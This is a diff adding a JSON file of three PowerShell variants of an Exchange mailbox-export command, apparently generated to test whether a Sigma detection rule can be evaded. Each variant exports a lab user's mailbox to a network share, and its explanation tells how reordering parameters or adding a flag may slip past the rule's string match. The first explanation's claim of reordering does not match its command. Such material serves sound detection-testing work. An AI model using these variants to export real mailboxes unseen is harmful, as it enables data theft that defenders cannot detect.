@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"New-MailboxExportRequest -Mailbox 'LabUser' -FilePath \\\\Lab\\Share\\export.pst\"",
+    "explanation": "Reordering: The command reorders the parameters to potentially avoid the specific string match for ' -Mailbox ' and ' -FilePath \\\\'."
+  },
+  {
+    "output": "powershell.exe -Command \"New-MailboxExportRequest -FilePath \\\\Lab\\Share\\export.pst -Mailbox 'LabUser'\"",
+    "explanation": "Reordering: The parameters are reordered, which may prevent the Sigma rule from matching the exact sequence of ' -Mailbox ' followed by ' -FilePath \\\\'."
+  },
+  {
+    "output": "powershell.exe -Command \"New-MailboxExportRequest -Mailbox 'LabUser' -FilePath \\\\Lab\\Share\\export.pst -Verbose\"",
+    "explanation": "Insertion: Adding the '-Verbose' flag may not affect the command's intent but could change the parsed command line, potentially avoiding the Sigma string match."
+  }
+]
